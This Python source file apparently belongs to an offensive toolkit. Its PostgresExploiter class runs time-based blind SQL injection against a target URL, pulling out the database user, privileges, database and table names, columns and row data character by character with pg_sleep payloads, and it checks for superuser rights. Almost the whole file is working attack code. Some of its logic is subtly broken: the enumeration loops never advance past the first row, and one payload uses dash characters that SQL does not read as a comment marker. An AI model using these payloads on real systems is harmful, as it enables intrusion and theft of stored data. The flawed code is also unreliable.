"""
Author: Aleksa Zatezalo
Date: January 2025
Description: File that generates SQLi payloads
"""

import requests
import time
from typing import List, Dict, Optional, Union
from .payloads import PostgresPayloadGenerator
from ..encoders.http.postgres_encoder import PostgresHTTPEncoder

class PostgresExploiter:
    def __init__(self, sleep_time: int = 3, proxy: Optional[Dict[str, str]] = None):
        """
        Initialize the PostgreSQL exploiter.
        
        Args:
            sleep_time (int): Time in seconds to use for pg_sleep delays
            proxy (dict, optional): Proxy configuration e.g., {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
        """
        self.payload_gen = PostgresPayloadGenerator()
        self.sleep_time = sleep_time
        self.timeout = sleep_time + 2
        self.encoder = PostgresHTTPEncoder()
        self.proxy = proxy
        self.verify_ssl = False if proxy else True

    def set_proxy(self, proxy: Dict[str, str]) -> None:
        """
        Set proxy for HTTP requests.
        
        Args:
            proxy (dict): Proxy configuration dictionary
            
        Example:
            exploiter.set_proxy({
                'http': 'http://127.0.0.1:8080',
                'https': 'http://127.0.0.1:8080'
            })
        """
        self.proxy = proxy
        self.verify_ssl = False

    def remove_proxy(self) -> None:
        """Remove proxy configuration and restore SSL verification"""
        self.proxy = None
        self.verify_ssl = True

    def _send_request(self, url: str, payload: str) -> bool:
        """
        Send request and determine if delay occurred.
        
        Args:
            url (str): Target URL
            payload (str): SQL injection payload
            
        Returns:
            bool: True if delay was detected, False otherwise
        """
        try:
            encoded_payload = self.encoder.encode(payload)
            start_time = time.time()
            
            requests.get(
                url + encoded_payload, 
                timeout=self.timeout,
                proxies=self.proxy,
                verify=False,  # Disable SSL verification
                allow_redirects=False  # Prevent redirects
            )
            return False
        except requests.Timeout:
            end_time = time.time()
            return (end_time - start_time) >= self.sleep_time
        except requests.RequestException as e:
            print(f"Request error: {str(e)}")
            return False

    def extract_current_user(self, url: str) -> Dict[str, str]:
        """
        Extract current database user and their privileges.
        
        Args:
            url (str): Target URL vulnerable to SQL injection
            
        Returns:
            Dict[str, str]: Dictionary containing username and privileges
        """
        result = {
            'username': '',
            'privileges': ''
        }
        
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
        
        # Extract username
        char_pos = 1
        while True:
            char_found = False
            for char in charset:
                payload = f"; AND (SELECT CASE WHEN (SELECT substr(current_user,{char_pos},1)='{char}') " \
                         f"THEN pg_sleep({self.sleep_time}) ELSE pg_sleep(0) END)--"
                
                if self._send_request(url, payload):
                    result['username'] += char
                    char_pos += 1
                    char_found = True
                    break
            
            if not char_found:
                break
        
        # Extract privileges
        char_pos = 1
        while True:
            char_found = False
            for char in charset + ',':
                payload = f"; AND (SELECT CASE WHEN (SELECT substr(string_agg(privilege_type, ','),{char_pos},1) " \
                         f"FROM information_schema.role_table_grants WHERE grantee = current_user)='{char}' " \
                         f"THEN pg_sleep({self.sleep_time}) ELSE pg_sleep(0) END)--"
                
                if self._send_request(url, payload):
                    result['privileges'] += char
                    char_pos += 1
                    char_found = True
                    break
            
            if not char_found:
                break

        return result

    def extract_dbs(self, url: str) -> List[str]:
        """
        Extract database names using time-based PostgreSQL injection.
        
        Args:
            url (str): Target URL vulnerable to SQL injection
            
        Returns:
            List[str]: List of discovered database names
        """
        databases = []
        current_db = ""
        char_pos = 1
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"

        while True:
            char_found = False
            for char in charset:
                payload = f"; AND (SELECT CASE WHEN (SELECT substr(datname,{char_pos},1) " \
                         f"FROM pg_database LIMIT 1)='{char}' THEN pg_sleep({self.sleep_time}) " \
                         f"ELSE pg_sleep(0) END)--"
                
                if self._send_request(url, payload):
                    current_db += char
                    char_pos += 1
                    char_found = True
                    break
            
            if not char_found:
                if current_db:
                    databases.append(current_db)
                    current_db = ""
                    char_pos = 1
                else:
                    break

        return databases

    def extract_table_info(self, url: str, db_name: str = 'public') -> List[Dict[str, List[str]]]:
        """
        Extract table names and their columns.
        
        Args:
            url (str): Target URL vulnerable to SQL injection
            db_name (str): Database name to extract tables from (default: 'public')
            
        Returns:
            List[Dict[str, List[str]]]: List of dictionaries containing table names and their columns
        """
        tables_info = []
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"

        # Get table names
        current_table = ""
        char_pos = 1
        tables = []

        while True:
            char_found = False
            for char in charset:
                payload = f"; AND (SELECT CASE WHEN (SELECT substr(tablename,{char_pos},1) " \
                         f"FROM pg_tables WHERE schemaname='{db_name}' LIMIT 1)='{char}' " \
                         f"THEN pg_sleep({self.sleep_time}) ELSE pg_sleep(0) END)--"
                
                if self._send_request(url, payload):
                    current_table += char
                    char_pos += 1
                    char_found = True
                    break
            
            if not char_found:
                if current_table:
                    tables.append(current_table)
                    current_table = ""
                    char_pos = 1
                else:
                    break

        # Get columns for each table
        for table in tables:
            columns = []
            current_column = ""
            char_pos = 1

            while True:
                char_found = False
                for char in charset:
                    payload = f"; AND (SELECT CASE WHEN (SELECT substr(column_name,{char_pos},1) " \
                             f"FROM information_schema.columns WHERE table_name='{table}' LIMIT 1)='{char}' " \
                             f"THEN pg_sleep({self.sleep_time}) ELSE pg_sleep(0) END)--"
                    
                    if self._send_request(url, payload):
                        current_column += char
                        char_pos += 1
                        char_found = True
                        break
                
                if not char_found:
                    if current_column:
                        columns.append(current_column)
                        current_column = ""
                        char_pos = 1
                    else:
                        break

            tables_info.append({table: columns})

        return tables_info

    def extract_data(self, url: str, table_name: str, column_name: str, limit: int = 5) -> List[str]:
        """
        Extract data from specified table and column.
        
        Args:
            url (str): Target URL vulnerable to SQL injection
            table_name (str): Name of the table to extract data from
            column_name (str): Name of the column to extract data from
            limit (int): Maximum number of rows to extract
            
        Returns:
            List[str]: List of extracted values
        """
        data = []
        current_value = ""
        row_position = 0
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-@.!"

        while row_position < limit:
            char_pos = 1
            current_value = ""
            while True:
                char_found = False
                for char in charset:
                    payload = f"; AND (SELECT CASE WHEN (SELECT substr(CAST({column_name} as varchar)," \
                             f"{char_pos},1) FROM {table_name} OFFSET {row_position} LIMIT 1)='{char}' " \
                             f"THEN pg_sleep({self.sleep_time}) ELSE pg_sleep(0) END)--"
                    
                    if self._send_request(url, payload):
                        current_value += char
                        char_pos += 1
                        char_found = True
                        break
                
                if not char_found:
                    if current_value:
                        data.append(current_value)
                        break
                    else:
                        return data
            
            row_position += 1

        return data

    def is_superuser(self, url: str) -> bool:
        """
        Check if the current database user is a superuser.
        
        Args:
            url (str): Target URL vulnerable to SQL injection
            
        Returns:
            bool: True if current user is superuser, False otherwise
        """

        payload = f";SELECT case when (SELECT current_setting('is_superuser'))='on' then pg_sleep({self.sleep_time}) end;––"
        return self._send_request(url, payload)
    
    